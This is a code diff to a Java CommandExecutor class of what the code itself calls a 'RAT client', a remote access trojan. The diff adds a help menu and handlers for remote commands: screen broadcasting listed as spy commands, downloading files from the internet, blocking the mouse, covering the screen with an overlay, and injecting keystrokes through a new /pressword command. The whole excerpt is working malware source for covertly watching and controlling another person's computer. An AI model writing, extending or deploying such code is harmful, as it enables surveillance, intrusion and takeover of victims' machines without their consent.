@@ -61,6 +61,43 @@ public class CommandExecutor {
 				return;
 			}
 			logger.log("Executing: " + command);
+			// Help
+			if (command.equalsIgnoreCase("/help")) {
+				Connection.sendMessage("\n CLIENT COMMANDS:");
+				Connection.sendMessage("/echo - check if the server is connected");
+				Connection.sendMessage("/clientlog - get RAT client log");
+				Connection.sendMessage("/mode - toggle console to direct mode (executing files without cmd)");
+				Connection.sendMessage("/download <link> <filename> - download file from internet");
+				Connection.sendMessage("/stopapp - stop RAT process");
+				Connection.sendMessage("/devhelp - show help for developer");
+				Connection.sendMessage("\n SPY COMMANDS:");
+				Connection.sendMessage("/screen - toggle screen broadcast");
+				Connection.sendMessage("/setscreenquality <0.1 to 1> - set broadcast quality");
+				Connection.sendMessage("/setscreentimeout <seconds> - set screen capture timeout");
+				Connection.sendMessage("\n FUN COMMANDS:");
+				Connection.sendMessage("/overlay - toggle block the screen with a white window");
+				Connection.sendMessage("/blockmouse - freeze mouse in X:0 Y:0 position");
+				Connection.sendMessage("/msg <show/close/closeall> - manage msgs");
+				Connection.sendMessage("/chat <hide/create/settop/clear/msg> - chat with remote user");
+				Connection
+						.sendMessage("/player <list/stop/stoplast/stopall/file_path_to_play> - .wav soundfile player");
+				Connection.sendMessage("\n KEYBOARD COMMANDS:");
+				Connection.sendMessage("/press <key> - presses key");
+				Connection.sendMessage("/release <key> - releases key");
+				Connection.sendMessage("/presskey <key> - presses and releases key");
+				Connection.sendMessage("/presskeys <keys> - at first presses and then releases keys");
+				Connection.sendMessage("/pressword <word> - enter a word \n");
+				return;
+			}
+			if (command.equalsIgnoreCase("/devhelp")) {
+				Connection.sendMessage("\n DEV HELP:");
+				Connection.sendMessage("/tasklist");
+				Connection.sendMessage("/tasklistfast");
+				Connection.sendMessage("/player soundpacket");
+				Connection.sendMessage("/edit=[path]");
+				Connection.sendMessage("/debug_runconnection \n");
+				return;
+			}
 			// toggle overlay
 			if (command.equalsIgnoreCase("/overlay")) {
 				if (GraphicsEnvironment.isHeadless()) {
@@ -214,6 +251,17 @@ public class CommandExecutor {
 				}
 				// Releasing
 				for (String key : args) {
+					electron.functions.Keyboard.release(electron.functions.Keyboard.getKeyCode(key));
+				}
+				Connection.sendMessage(message);
+				return;
+			}
+			if (isMultiCommand("/pressword", command)) {
+				String[] args = getCommandArgs(command);
+				String message = "[KEYBOARD]: pressed and released keys: " + command;
+				for (String key : args) {
+					electron.functions.Keyboard.press(electron.functions.Keyboard.getKeyCode(key));
+					message = message + " " + key;
 					electron.functions.Keyboard.release(electron.functions.Keyboard.getKeyCode(key));
 				}
 				Connection.sendMessage(message);
